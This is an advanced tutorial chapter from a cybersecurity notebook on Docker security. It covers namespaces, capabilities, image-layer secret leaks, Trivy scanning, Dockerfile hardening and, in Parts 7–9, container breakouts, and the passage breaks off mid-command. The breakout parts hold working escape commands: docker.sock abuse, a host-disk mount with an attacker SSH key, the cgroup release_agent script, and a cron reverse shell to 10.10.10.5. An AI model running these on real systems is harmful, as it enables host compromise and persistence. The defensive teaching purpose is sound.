---
title: 'Docker Security, Image Scanning (Trivy) & Container Breakouts'
description: >-
  A Advanced-level Cloud Security chapter from Praneeth's cybersecurity
  notebook.
sidebar:
  order: 6
  label: '06 · Docker Security, Image Scanning (Trivy) & Container Breakouts'
head:
  - tag: link
    attrs:
      rel: canonical
      href: >-
        https://ping-praneeth.vercel.app/notebook/cloud-security/06-docker-security-image-scanning-trivy-and-container-breakouts
---
**Level:** Advanced · **Track:** Cloud Security · **Read time:** 320 min

This is Chapter 6 of the Cloud Security notebook. The previous chapters mapped the shared-responsibility model, hands-on recon against AWS, Azure/Entra ID and GCP, and the multi-cloud tooling stack. This chapter drops down a layer — from cloud control planes to the workloads that actually run on them — and takes apart **containers**. Almost every modern cloud workload ships as a container image, so the security of your cloud estate is, in large part, the security of your images and the runtime that executes them.

The single idea to carry through the whole chapter: **a container is not a lightweight virtual machine — it is a normal Linux process that has been lied to about the world around it.** There is no hard hardware boundary between a container and its host the way there is with a hypervisor. A container shares the host kernel. Everything that "contains" it — namespaces, cgroups, capabilities, seccomp, an LSM — is a set of kernel features that can be misconfigured, disabled, or bypassed. Understand what those features actually do, and both the offensive (breakout) and defensive (hardening, detection) sides of container security stop being magic.

Everything here is for images, hosts and clusters you own or are explicitly authorised in writing to assess. Running a breakout primitive against infrastructure you do not control is unauthorised access and a crime in essentially every jurisdiction. Build the lab described in Part 11 on your own machine, or practise on the deliberately-vulnerable ranges named in the final part.

---

## Part 1: What a Container Actually Is — The Kernel Primitives

Before Docker, before Trivy, before a single breakout, you must be able to answer one question precisely: *what stops a process inside a container from seeing and touching the whole host?* The answer is a small stack of Linux kernel features. Every container escape is, ultimately, a failure or absence of one of them.

### Namespaces — the lie about "what exists"

A **namespace** partitions a global system resource so that processes inside the namespace see their own isolated instance of it. The process thinks it has the whole resource; really it has a slice. The kernel provides several namespace types, and a "container" is just a process (and its children) placed into a fresh set of them:

| Namespace | Isolates | What breaks if it's shared with the host |
|-----------|----------|------------------------------------------|
| `pid` | Process IDs | Container sees/kills host processes; `--pid=host` is a breakout primitive |
| `mnt` | Mount points / filesystem view | Container sees host filesystem tree |
| `net` | Network stack (interfaces, routes, ports) | Container shares host interfaces; `--net=host` removes network isolation |
| `uts` | Hostname and domain name | Cosmetic, but `--uts=host` leaks host identity |
| `ipc` | System V IPC, POSIX message queues | Shared memory access between container and host |
| `user` | UID/GID mappings | Root-in-container maps to unprivileged host UID **only if enabled** |
| `cgroup` | cgroup root view | Container sees host cgroup hierarchy paths |
| `time` | Boot/monotonic clocks | Rarely security-relevant |

The `user` namespace is the most important one for security and, by default in Docker, **it is not enabled**. That means UID 0 inside the container is UID 0 on the host. The isolation you are relying on in a default Docker setup is therefore *not* "root in the container is a harmless fake root" — it is capabilities, seccomp and the LSM doing the actual containment. Remember that; it is why so many breakouts start from "I am root in the container."

You can watch namespaces directly. Every process exposes its namespaces as symlinks under `/proc/<pid>/ns/`:

```bash
# On the host, look at your shell's namespaces
ls -l /proc/self/ns/
# lrwxrwxrwx 1 root root 0 ... net -> 'net:[4026531840]'
# lrwxrwxrwx 1 root root 0 ... pid -> 'pid:[4026531836]'
# lrwxrwxrwx 1 root root 0 ... mnt -> 'mnt:[4026531841]'

# Now start a container and compare
docker run --rm -it alpine sh -c 'ls -l /proc/self/ns/'
# The inode numbers in the [ ... ] differ from the host — different namespaces.
```

The numbers in brackets are namespace **inode IDs**. If a container's namespace inode matches the host's for a given type, that namespace is *shared* with the host — a red flag. This exact comparison is how tools like `amicontained` fingerprint containment.

### Control groups (cgroups) — the lie about "how much"

**cgroups** limit and account for resource usage: CPU, memory, PIDs, block I/O, devices. They are about *quotas*, not *visibility*. A container with a 512 MB memory cgroup limit gets OOM-killed at 512 MB even though the host has 64 GB. Security relevance: without a PID or memory limit a container can fork-bomb or balloon memory and take out the host (a denial-of-service against the node). The **device cgroup controller** also decides which device nodes a container may access — and, as you'll see in Part 9, the legacy cgroup-v1 `release_agent` mechanism is a classic escape primitive when a container has `CAP_SYS_ADMIN`.

### Capabilities — chopping root into pieces

Traditional UNIX had a binary model: you were root (UID 0, all-powerful) or you were not. Linux **capabilities** split root's powers into ~40 distinct units, each independently grantable. A process can hold `CAP_NET_BIND_SERVICE` (bind ports below 1024) without holding `CAP_SYS_ADMIN` (mount filesystems, and much more).

Docker runs containers with a **restricted default capability set** — it drops most and keeps a curated list. The dangerous ones it drops by default include `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, and `CAP_NET_ADMIN`. The ones an attacker most wants to see granted:

| Capability | What it grants | Breakout relevance |
|------------|----------------|--------------------|
| `CAP_SYS_ADMIN` | Mount, pivot_root, many admin syscalls | The "new root" — cgroup release_agent escape, mount host disk |
| `CAP_SYS_PTRACE` | ptrace any process | Inject into host processes if PID namespace shared |
| `CAP_SYS_MODULE` | Load kernel modules | Load a malicious module = full host kernel control |
| `CAP_DAC_READ_SEARCH` | Bypass file read permission checks | `open_by_handle_at` host-file read (Shocker attack) |
| `CAP_NET_RAW` | Craft raw packets | ARP spoof / sniff on shared networks |
| `CAP_SYS_RAWIO` | Direct I/O port / /dev/mem access | Read/write physical memory |

The rule to memorise: **`docker run --privileged` grants ALL capabilities and removes most other restrictions**. `--cap-add=SYS_ADMIN` grants one very dangerous one. Either is close to game over.

### Seccomp — filtering syscalls

**seccomp-bpf** filters which system calls a process may make. Docker ships a **default seccomp profile** that blocks ~44 of the 300+ syscalls, including dangerous ones like `mount`, `reboot`, `kexec_load`, `init_module`, and `ptrace` (in some configs). Running with `--security-opt seccomp=unconfined` disables this filter entirely — another privilege the attacker loves to find.

### LSMs — AppArmor and SELinux

A **Linux Security Module** applies mandatory access control on top of everything else. Docker's default AppArmor profile (`docker-default`) blocks writes to sensitive `/proc` and `/sys` paths. On RHEL-family hosts, SELinux (`container-t` type, enforced by `container-selinux`) does the same job. `--security-opt apparmor=unconfined` removes it.

Putting it together, the containment of a default Docker container looks like this:

```mermaid
flowchart TD
    P[Process in container] --> NS[Namespaces: what it can SEE]
    P --> CG[cgroups: how MUCH it can use]
    P --> CAP[Capabilities: which root powers]
    P --> SC[seccomp: which syscalls]
    P --> LSM[AppArmor/SELinux: mandatory access control]
    NS --> K[Shared Host Kernel]
    CG --> K
    CAP --> K
    SC --> K
    LSM --> K
    K --> HW[Host hardware / other containers]
    style K fill:#f88,stroke:#900
```

Notice the single shared kernel at the bottom. That is the whole story: a **kernel vulnerability** or a **misconfiguration of any layer above it** collapses the boundary. There is no hypervisor. This is precisely why "defence in depth" for containers means keeping *every* layer intact, and why a single `--privileged` flag undoes all of them at once.

---

## Part 2: The Docker Architecture — Daemon, containerd, runc, Images

You cannot secure or attack what you cannot diagram. Docker is not one program; it is a stack of components, and knowing which does what tells you where the trust boundaries and the juicy targets are.

```mermaid
flowchart LR
    CLI[docker CLI] -->|REST over /var/run/docker.sock| D[dockerd daemon]
    D --> CD[containerd]
    CD --> SH[containerd-shim]
    SH --> RC[runc]
    RC --> C[Container process]
    D --> REG[(Registry: Docker Hub / ECR / GHCR)]
    style D fill:#bbf
    style RC fill:#fb8
```

- **`docker` CLI** — the client. It talks to the daemon over a socket. It has no special powers of its own; it just sends API requests.
- **`dockerd`** — the **Docker daemon**, a long-running root process. It exposes the Docker Engine REST API, by default over the UNIX socket `/var/run/docker.sock`. **This daemon runs as root, and anyone who can talk to its socket can run a container that mounts the host filesystem — i.e. root on the host.** Memorise that; it is the most exploited fact in container security (Part 7).
- **`containerd`** — the high-level container runtime. Manages image pull, storage, and container lifecycle. Now a CNCF-graduated project used directly by Kubernetes without Docker.
- **`containerd-shim`** — one per container; keeps the container running even if `containerd` restarts, and reports exit status.
- **`runc`** — the low-level OCI runtime. It is the tiny binary that actually calls `clone()`/`unshare()` with the right namespace flags, sets up cgroups, applies the seccomp profile, drops capabilities, and `exec`s your entrypoint. `runc` is where CVE-2019-5736 and CVE-2024-21626 live — bugs in the exact code that sets up isolation.

### Images, layers, and the union filesystem

A Docker **image** is a stack of read-only **layers** plus a JSON **manifest** and a **config** blob. Each instruction in a Dockerfile (`RUN`, `COPY`, `ADD`) that changes the filesystem produces a new layer — a tarball of the *diff* from the previous layer. At runtime, Docker stacks these read-only layers and adds a thin writable layer on top using a **union filesystem** (overlay2 on modern Linux). The container sees a single merged tree; writes go only to the top layer (copy-on-write).

The security consequence is enormous and non-obvious: **layers are immutable and additive. Deleting a file in a later layer does not remove it from the earlier layer.** If you `COPY` a private key in one instruction and `RUN rm` it in the next, the key is *still in the image*, recoverable from the earlier layer. This is one of the most common real-world container secret leaks, and Part 4 shows how to extract it.

```mermaid
flowchart TD
    L0[Layer 0: base OS - alpine:3.19] --> L1[Layer 1: RUN apk add python3]
    L1 --> L2[Layer 2: COPY id_rsa /tmp]
    L2 --> L3[Layer 3: RUN rm /tmp/id_rsa  -- key STILL in Layer 2!]
    L3 --> RW[Writable container layer - copy-on-write]
    style L2 fill:#f88
```

---

## Part 3: The Docker Attack Surface — A Threat Model

Before diving into tools, orient on *where* the risk lives. A container deployment has attack surface at build time, at rest, and at runtime.

```mermaid
mindmap
  root((Docker Attack Surface))
    Build
      Malicious base image
      Dependency with known CVE
      Secrets baked into layers
      Unpinned tags (:latest)
    Registry / Supply chain
      Typosquatted image names
      Compromised registry creds
      Unsigned images
    Runtime config
      --privileged
      Mounted docker.sock
      Host mounts (/, /proc, /var/run)
      --net=host / --pid=host
      Added capabilities
      seccomp=unconfined
    Kernel / runtime
      runc CVEs (5736, 21626)
      Kernel LPE from container
      cgroup release_agent
    Operations
      Root inside container
      No resource limits (DoS)
      Exposed daemon on 2375/tcp
```

Two failure modes dominate real incidents:

1. **Vulnerable / poisoned images** — you ship a CVE (Log4Shell in a base image, an outdated OpenSSL) or an image with a backdoor. Trivy (Part 5) is the primary defence.
2. **Over-privileged runtime** — the container is given `--privileged`, the Docker socket, or a host mount, and an attacker who lands code execution inside it escapes to the host trivially (Parts 7–9).

Everything below maps onto reducing one of these two.

**Red team framing:** when you land a shell inside a container on an engagement, your first three questions are exactly the runtime-config items above — *Am I root? What capabilities do I have? Is docker.sock or a host path mounted?* Part 10's lab walks that checklist.

---

## Part 4: Reading Image Layers and Finding Leaked Secrets

Since layers are immutable, the offensive and defensive skill here is the same: **crack an image open and read every layer's history and contents.** You need no exotic tooling — `docker history`, `docker save`, and a tar extractor get you most of the way; `dive` makes it pleasant.

### `docker history` — the build recipe

```bash
docker history --no-trunc python:3.11-slim
# Shows each layer, the instruction that created it, and its size.
# A giant COPY or an ADD of a URL is worth investigating.
```

The `--no-trunc` flag prints the full command for each layer instead of truncating at 45 characters — essential, because the interesting part (a `curl ... | bash`, a hard-coded token) is usually past the cut-off.

### Exporting and unpacking an image by hand

`docker save` serialises an image (all layers + metadata) to a tar stream. This is the manual, tool-agnostic way to inspect an image — useful on a locked-down box or when triaging a suspicious image you do not want to `run`.

```bash
# Save the image to a tarball
docker save nginx:1.25 -o nginx.tar

# Unpack it
mkdir nginx_img && tar -xf nginx.tar -C nginx_img
ls nginx_img
# blobs/  index.json  manifest.json  oci-layout   (OCI format)
# or:  <hash>/layer.tar ...  manifest.json  repositories  (legacy format)

# Each layer.tar (or blob) is a filesystem diff. Extract one and grep it:
mkdir layer0 && tar -xf nginx_img/blobs/sha256/<layer-hash> -C layer0 2>/dev/null
grep -rIl "PRIVATE KEY\|password\|AKIA\|token" layer0/ 2>/dev/null
```

Here `-o` names the output file; `-xf` extracts a tar; `-C` sets the extraction directory; `grep -rIl` recurses (`-r`), skips binary files (`-I`), and lists only matching filenames (`-l`). Iterating every layer and grepping for `PRIVATE KEY`, `AKIA` (AWS access-key prefix), `password`, `.env`, `id_rsa`, and JWT patterns is how you recover a secret that a `RUN rm` "deleted".

### `dive` — an interactive layer explorer (tool from scratch)

**What it is:** `dive` is an open-source TUI (terminal UI) tool that opens an image and lets you walk layer by layer, showing exactly which files each layer added, modified, or removed, plus an "efficiency" score that flags wasted space (often a sign of a secret added-then-deleted).

**Install (Linux):**

```bash
# Download the release .deb (check the project releases page for the current version)
VER=0.12.0
curl -sSL -o dive.deb "https://github.com/wagoodman/dive/releases/download/v${VER}/dive_${VER}_linux_amd64.deb"
sudo apt install ./dive.deb
# or via Homebrew on macOS:  brew install dive
```

**Core workflow:**

```bash
dive nginx:1.25
```

The left pane lists layers with their creating command; the right pane shows the file tree, colour-coded: green = added, yellow = modified, red = removed. Tab switches panes. When you select a layer that *adds* a secret and a later layer that *removes* it, `dive` shows the file in both — proving the secret is still recoverable from the earlier layer. **Bug-bounty / red-team angle:** pulling a target's public image from Docker Hub or GHCR and running `dive`/`docker history` on it is a legitimate recon step — organisations frequently leak internal hostnames, package feeds with embedded creds, and API tokens in published images.

### Secret-scanning the filesystem

Trivy (next part) also scans for secrets. But a quick, dependency-light pass with `grep` over an unpacked image, or with `trufflehog`/`gitleaks` over the extracted layers, catches the obvious ones:

```bash
# gitleaks over an extracted image directory
gitleaks detect --no-git --source ./nginx_img -v
```

| What leaks in images | Pattern to grep | Why it happens |
|----------------------|-----------------|----------------|
| Cloud keys | `AKIA[0-9A-Z]{16}`, `ASIA...` | `COPY . .` sweeps in a stray `.aws/credentials` |
| SSH private keys | `-----BEGIN OPENSSH PRIVATE KEY-----` | Build needs git-over-SSH; key baked then "removed" |
| `.env` files | `DATABASE_URL=`, `SECRET_KEY=` | `COPY . .` without a `.dockerignore` |
| Registry/npm tokens | `//registry.npmjs.org/:_authToken=` | `.npmrc` copied into build context |
| JWT / API tokens | `eyJ` prefix (base64 JWT header) | Hard-coded test tokens |

The single most effective preventive control is a **`.dockerignore`** that excludes `.git`, `.env`, `*.pem`, `.aws`, `.ssh`, and friends, plus **multi-stage builds** (Part 6) so build-time secrets never reach the final image.

---

## Part 5: Image Scanning with Trivy — From Zero to CI Gate

**What Trivy is:** Trivy (by Aqua Security) is the de-facto open-source vulnerability and misconfiguration scanner for containers and cloud-native artifacts. It is a single Go binary with no server and no dependencies. It scans **container images, filesystems, git repos, and running Kubernetes clusters** for: known **CVEs** in OS packages and language dependencies, **misconfigurations** (Dockerfile/Kubernetes/Terraform), hard-coded **secrets**, and it can emit an **SBOM** (software bill of materials). It maintains a local vulnerability database it pulls from an OCI registry and refreshes automatically.

**Why it exists:** you cannot manually track whether the 400 packages in your base image have known CVEs. Trivy diff's your image's package inventory against public vulnerability feeds (NVD, distro security trackers, GitHub Advisory DB) and tells you exactly what is exploitable and whether a fixed version exists.

### Install

```bash
# Debian/Ubuntu (Kali included)
sudo apt-get install wget gnupg -y
wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | \
  gpg --dearmor | sudo tee /usr/share/keyrings/trivy.gpg > /dev/null
echo "deb [signed-by=/usr/share/keyrings/trivy.gpg] \
  https://aquasecurity.github.io/trivy-repo/deb generic main" | \
  sudo tee /etc/apt/sources.list.d/trivy.list
sudo apt-get update && sudo apt-get install trivy -y

# Or, anywhere, run it as a container (nicely self-referential):
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
  aquasec/trivy:latest image nginx:1.25
# NOTE: mounting docker.sock into a scanner is convenient but IS the
# very risk Part 7 covers — prefer 'trivy image --docker-host' or scan a tarball.

trivy --version
```

### Scanning a container image

```bash
trivy image python:3.9-slim
```

Annotated output (trimmed to the shape you actually see):

```
python:3.9-slim (debian 12.4)
============================
Total: 137 (UNKNOWN: 0, LOW: 92, MEDIUM: 31, HIGH: 12, CRITICAL: 2)

┌───────────────┬────────────────┬──────────┬────────┬───────────────────┬───────────────┐
│    Library    │ Vulnerability  │ Severity │ Status │ Installed Version │ Fixed Version │
├───────────────┼────────────────┼──────────┼────────┼───────────────────┼───────────────┤
│ libssl3       │ CVE-2024-XXXX  │ CRITICAL │ fixed  │ 3.0.11-1~deb12u1  │ 3.0.13-1~deb..│
│ libc-bin      │ CVE-2023-XXXX  │ HIGH     │ affected│ 2.36-9           │               │
└───────────────┴────────────────┴──────────┴────────┴───────────────────┴───────────────┘
```

Read it like this: **Status `fixed` with a `Fixed Version` = actionable now** (rebuild on a newer base or `apt upgrade` the package). **Status `affected` with no fixed version = no upstream patch yet**; you accept the risk, add compensating controls, or drop the package. `CRITICAL`/`HIGH` are your triage priority.

### The flags that matter

| Flag | Effect | When to use |
|------|--------|-------------|
| `--severity CRITICAL,HIGH` | Only show these severities | Cut noise; focus triage |
| `--ignore-unfixed` | Hide vulns with no available fix | Actionable-only view; CI gates |
| `--exit-code 1` | Return non-zero if matches found | **Fail a CI pipeline on findings** |
| `--scanners vuln,secret,misconfig` | Choose scan types | Enable secret + IaC scanning |
| `--format json -o out.json` | Machine-readable output | Feed dashboards / policy engines |
| `--format sarif` | SARIF output | GitHub code-scanning integration |
| `--vuln-type os,library` | OS packages vs app deps | Separate base-image vs app risk |
| `--offline-scan` | Don't call external APIs | Air-gapped scanning |
| `--cache-dir` / `--download-db-only` | Manage the vuln DB | Pre-seed DB in CI |

### Filesystem, repo, config and SBOM modes

Trivy is not just for built images. Scan a project directory *before* you build:

```bash
# Scan a source tree for vulnerable deps + secrets + Dockerfile misconfig
trivy fs --scanners vuln,secret,misconfig .

# Scan a remote git repo without cloning it yourself
trivy repo https://github.com/example/app

# Lint a Dockerfile / Kubernetes / Terraform for misconfigurations
trivy config .
# e.g. flags: "Image user should not be 'root'", "no HEALTHCHECK",
#             "container running with privileged=true"

# Generate a CycloneDX SBOM
trivy image --format cyclonedx -o sbom.json myapp:1.0
```

**Blue-team usage:** `trivy config` catches the dangerous runtime flags (`privileged: true`, `hostPID`, added capabilities) in your Kubernetes manifests and Dockerfiles *before* they ship — shifting the Part 7–9 breakout conditions left into CI.

### Gating a CI pipeline

The whole point is to *fail the build* when a fixable critical bug is present. A minimal GitHub Actions / GitLab step:

```yaml
# .gitlab-ci.yml (excerpt)
container_scan:
  image: aquasec/trivy:latest
  script:
    - trivy image --exit-code 0 --severity LOW,MEDIUM "$IMAGE"      # report only
    - trivy image --exit-code 1 --severity HIGH,CRITICAL \
        --ignore-unfixed "$IMAGE"                                    # fail build
```

The pattern — **report low/medium, fail on fixable high/critical** — is the industry-standard balance between hygiene and shipping velocity. Suppress individual false positives in a `.trivyignore` file (one CVE ID per line) rather than lowering the whole gate.

---

## Part 6: Building Hardened Images — Dockerfile Best Practices

Scanning tells you what's wrong; hardening stops it being wrong in the first place. The following are the controls that measurably reduce both CVE count and breakout blast radius, roughly in order of impact.

### 1. Start from a minimal, pinned base

Every package in your base image is attack surface and a potential CVE. Prefer `-slim`, `alpine`, or **distroless** images, and pin by digest, not a floating tag.

```dockerfile
# Bad: full OS, floating tag — non-reproducible, huge CVE surface
FROM python:latest

# Good: slim, pinned to a digest (immutable, reproducible)
FROM python:3.11-slim@sha256:0e1f...   # digest pin

# Best for compiled apps: distroless — no shell, no package manager
FROM gcr.io/distroless/static-debian12
```

A distroless image has **no shell and no package manager**, which alone defeats a huge fraction of post-exploitation and breakout tooling — an attacker who lands RCE finds no `sh`, no `curl`, no `apt`.

### 2. Multi-stage builds — keep build secrets and toolchains out of the final image

```dockerfile
# ---- build stage: has compilers, source, maybe secrets ----
FROM golang:1.22 AS build
WORKDIR /src
COPY . .
RUN CGO_ENABLED=0 go build -o /app ./cmd/server

# ---- final stage: only the binary ships ----
FROM gcr.io/distroless/static-debian12
COPY --from=build /app /app
USER 65532:65532
ENTRYPOINT ["/app"]
```

The compilers, the full source tree, and any build-time credentials live only in the `build` stage and are discarded. The shipped image is a single static binary on distroless.

### 3. Never run as root

By default the container's main process is UID 0. Add a non-root user and switch to it. Combined with the (default-off) user namespace, this is real defence.

```dockerfile
RUN adduser --disabled-password --gecos "" --uid 10001 appuser
USER 10001
```

**Why it matters for breakouts:** almost every escape in Part 9 assumes root inside the container. A non-root container process cannot mount, cannot abuse `CAP_SYS_ADMIN` (it won't have it), and cannot write to most host mounts.

### 4. Handle build secrets correctly

Never `COPY` a secret or pass it as an `ARG` (ARGs are visible in `docker history`). Use BuildKit secret mounts, which are never written to a layer:

```dockerfile
# syntax=docker/dockerfile:1
RUN --mount=type=secret,id=npmtoken \
    NPM_TOKEN=$(cat /run/secrets/npmtoken) npm ci
```

```bash
DOCKER_BUILDKIT=1 docker build --secret id=npmtoken,src=./npm_token.txt -t app .
```

### 5. Drop capabilities and set a read-only root filesystem at build/deploy

Hardening extends into the run invocation and orchestration manifest:

```bash
docker run \
  --read-only \
  --cap-drop=ALL --cap-add=NET_BIND_SERVICE \
  --security-opt no-new-privileges \
  --pids-limit=200 \
  --memory=512m --cpus=1 \
  --user 10001:10001 \
  myapp:1.0
```

| Flag | Hardening effect |
|------|------------------|
| `--read-only` | Root FS immutable; attacker can't drop tools/persist |
| `--cap-drop=ALL` | Remove all capabilities, then add back only what's needed |
| `--security-opt no-new-privileges` | Block setuid/`execve` privilege gain — kills many LPEs |
| `--pids-limit` | Stop fork bombs (DoS on the node) |
| `--memory` / `--cpus` | Bound resource-exhaustion DoS |
| `--user` | Run as non-root even if the image forgot to |
| `--tmpfs /tmp` | Writable scratch without a writable root FS |

### 6. Add HEALTHCHECK and pin dependencies

`trivy config` will flag a missing `HEALTHCHECK`. Pin OS and language packages to specific versions so a rebuild is reproducible and a supply-chain swap is visible in the diff.

Here is the build-and-verify loop these practices imply:

```mermaid
flowchart LR
    A[Write Dockerfile] --> B[trivy config Dockerfile]
    B --> C[docker build multi-stage]
    C --> D[trivy image --exit-code 1 HIGH,CRITICAL]
    D -->|pass| E[Sign image - cosign]
    D -->|fail| A
    E --> F[Push to registry]
    F --> G[Admission control verifies signature at deploy]
```

---

## Part 7: The Docker Socket — Why It Is Game Over

Of all container misconfigurations, one is so dangerous and so common it deserves its own part: **exposing the Docker daemon socket to a container.**

Recall from Part 2 that `dockerd` runs as **root** and exposes its full API over `/var/run/docker.sock`. Anyone who can send requests to that socket can tell the root daemon to do anything Docker can do — including *"start a new container that bind-mounts the host's `/` and gives me a root shell in it."* The socket is, functionally, **passwordless root on the host**.

Why would a container ever have the socket? It is depressingly common: CI runners that build images ("Docker-in-Docker"), monitoring agents (cAdvisor, Portainer), and "watchtower"-style auto-updaters all get `-v /var/run/docker.sock:/var/run/docker.sock`. Each one is a root-equivalent trust grant.

### The exploit — from container with socket to host root

If you land in a container and find the socket:

```bash
# 1. Detect it
ls -la /var/run/docker.sock
# srw-rw---- 1 root docker 0 ... /var/run/docker.sock   <-- present = jackpot

# 2. Is the docker client present? If not, talk to the API with curl:
docker version 2>/dev/null || \
  curl -s --unix-socket /var/run/docker.sock http://localhost/version

# 3. Launch a NEW container that mounts the host root FS and chroots into it
docker -H unix:///var/run/docker.sock run -it --rm \
  --privileged --pid=host \
  -v /:/host alpine chroot /host sh
# You are now root on the HOST filesystem at /host.
```

The mechanism: you are not escaping *your* container. You are asking the host's root daemon to create a *new* container that has the host's disk mounted at `/host`, then `chroot`ing into it. From there you can read `/host/etc/shadow`, add an SSH key to `/host/root/.ssh/authorized_keys`, or write a cron job — full host compromise.

Pure-`curl` version when no docker client exists (create + start a container via the raw API):

```bash
SOCK=/var/run/docker.sock
# Create a container mounting host / at /host, running a reverse shell
curl -s -XPOST --unix-socket $SOCK -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["chroot","/host","sh","-c","id > /host/tmp/pwned"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  http://localhost/containers/create?name=esc
curl -s -XPOST --unix-socket $SOCK http://localhost/containers/esc/start
```

**Detection / defence:**
- Never mount `docker.sock` into a container. If a workload truly needs to build images, use **rootless BuildKit** or **Kaniko** (which build without the daemon), or a **socket proxy** (`tecnativa/docker-socket-proxy`) that whitelists only the specific API endpoints needed.
- On the host, treat membership of the `docker` group as equivalent to root — because it is.
- **Blue-team detection:** a Falco rule for "container created with sensitive mount" or "shell in a container spawned by dockerd with a host bind" fires on this. Watch for unexpected `POST /containers/create` with `Binds` containing `/` (Part 12).

---

## Part 8: Privileged Containers & Capability Abuse

The `--privileged` flag is the second great enabler. It: grants **all** capabilities, disables the seccomp and AppArmor profiles, and — critically — gives the container access to **all host devices** under `/dev`. That last point is the killer: with `--privileged`, the host's disk block devices appear inside the container, and you can simply mount the host's root partition.

### Escape from a privileged container by mounting the host disk

```bash
# Inside a --privileged container:
# 1. Find the host's root block device
cat /proc/self/mountinfo | grep -i 'ext4\|xfs' | head
fdisk -l 2>/dev/null       # lists /dev/sda, /dev/sda1, /dev/nvme0n1p1 ...

# 2. Mount it and step onto the host filesystem
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host        # works only because --privileged gave us the device + CAP_SYS_ADMIN
ls /mnt/host/root                # host's root home — you're out
echo 'ssh-ed25519 AAAA...attacker' >> /mnt/host/root/.ssh/authorized_keys
```

The reason this works: mounting requires `CAP_SYS_ADMIN` (which `--privileged` grants) **and** visibility of the block device (which `--privileged`'s device access grants). Remove either and the mount fails — which is exactly why hardened containers drop `CAP_SYS_ADMIN` and do not run privileged.

### `amicontained` — fingerprinting your containment (tool from scratch)

**What it is:** `amicontained` (by Jessie Frazelle) is a small Go binary that reports, from *inside* a container, exactly which containment features are active: your capabilities, seccomp mode, namespaces, AppArmor profile, and whether you appear to be in a container at all. It is the fastest way to know your escape options.

```bash
# Install (static binary)
AMICONTAINED_SHA=... ; VER=0.4.9
curl -fsSL -o amicontained \
  "https://github.com/genuinetools/amicontained/releases/download/v${VER}/amicontained-linux-amd64"
chmod +x amicontained && ./amicontained
```

Sample output from a dangerously-configured container:

```
Container Runtime: docker
Has Namespaces:
    pid: true
    user: false
AppArmor Profile: unconfined
Capabilities:
    BOUNDING -> chown dac_override ... sys_admin sys_ptrace   <-- sys_admin present!
Seccomp: disabled
```

Reading that: `user: false` (no user namespace → root is real), `sys_admin` present, `Seccomp: disabled`, `AppArmor: unconfined` — this container is effectively wide open; every escape in Part 9 is available.

### Capability-specific escapes

Even without full `--privileged`, a single added capability can be enough:

| Granted cap | Escape technique |
|-------------|------------------|
| `CAP_SYS_ADMIN` | cgroup-v1 `release_agent` escape (Part 9); mount host FS |
| `CAP_SYS_MODULE` | Compile & `insmod` a malicious kernel module → ring 0 |
| `CAP_SYS_PTRACE` + `--pid=host` | `ptrace`-inject shellcode into a host process |
| `CAP_DAC_READ_SEARCH` | `open_by_handle_at` brute force to read arbitrary host files (Shocker) |
| `CAP_NET_RAW` | Sniff/spoof on shared L2 (with `--net=host`) |

**Manual capability check without a tool:**

```bash
# Decode the process capability bitmask
grep CapEff /proc/self/status
# CapEff:	00000000a80425fb
capsh --decode=00000000a80425fb   # human-readable list
```

---

## Part 9: Container Breakouts — The Canonical Techniques

This part collects the escapes you will see referenced on HackTheBox/TryHackMe boxes, in real incident reports, and in CTFs. Each is presented as: *the precondition*, *the mechanism*, and *the concrete commands*. All are for lab use on hosts you own.

```mermaid
flowchart TD
    START[Shell inside container] --> Q1{Root in container?}
    Q1 -->|no| PE[Try in-container LPE first]
    Q1 -->|yes| Q2{docker.sock mounted?}
    Q2 -->|yes| SOCK[Part 7: daemon -> host root]
    Q2 -->|no| Q3{--privileged or CAP_SYS_ADMIN?}
    Q3 -->|privileged| DISK[Mount host disk / release_agent]
    Q3 -->|SYS_ADMIN only| RA[cgroup release_agent escape]
    Q3 -->|no| Q4{Sensitive host mount?}
    Q4 -->|/ or /root or /etc| HM[Write SSH key / cron on host]
    Q4 -->|no| Q5{Vulnerable runc?}
    Q5 -->|CVE-2019-5736 / 2024-21626| RUNC[Overwrite runc / leak host fd]
    Q5 -->|no| KERN[Kernel LPE - last resort]
```

### 9.1 The cgroup-v1 `release_agent` escape (needs CAP_SYS_ADMIN)

This is the famous "one-liner" escape. It abuses a cgroup-v1 feature: when the last process leaves a cgroup, the kernel runs the program named in the cgroup's `release_agent` file **on the host, as root**, if `notify_on_release` is set. With `CAP_SYS_ADMIN` you can mount a new cgroup hierarchy, point `release_agent` at a script on a filesystem the host can see, and trigger it.

```bash
# Precondition: CAP_SYS_ADMIN, cgroup v1, no AppArmor blocking the mount.
set -e
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
# Find where our container's filesystem lives on the host (overlay upperdir)
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
# Point release_agent at a script we control, via the host-visible path
echo "$host_path/cmd" > /tmp/cgrp/release_agent
# The payload that runs as ROOT on the host:
printf '#!/bin/sh\nps aux > %s/output\n' "$host_path" > /cmd
chmod +x /cmd
# Trigger: add ourselves to the cgroup then leave it
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output       # host process list — code ran on the host as root
```

Swap the payload for a reverse shell or an SSH-key write to fully own the host. **This is why modern hardening disables cgroup-v1, keeps AppArmor's `docker-default` (which blocks the mount), and never grants `CAP_SYS_ADMIN`.** On a cgroup-v2-only host this specific technique does not work.

### 9.2 Sensitive host mounts — the quiet killer

No privileged flag, no capability needed — just a careless `-v`. If any of these host paths is bind-mounted into the container, you can escape:

| Mounted host path | Escape |
|-------------------|--------|
| `/` or `/host` | Directly read/write everything; add SSH key to `/root/.ssh` |
| `/root` or `/home/x` | Write `authorized_keys` |
| `/etc` | Add a root user to `/etc/passwd`, edit `/etc/crontab` |
| `/var/run/docker.sock` | Part 7 daemon escape |
| `/proc` (host) | Write to `/proc/sys/kernel/core_pattern` → code exec as root |
| `/var/log` | Poison logs; sometimes symlink tricks |

```bash
# Example: host /etc mounted at /mnt/etc
echo 'evil:$6$saltsalt$hash...:0:0:root:/root:/bin/bash' >> /mnt/etc/passwd
# Or a cron persistence:
echo '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/10.10.10.5/4444 0>&1"' \
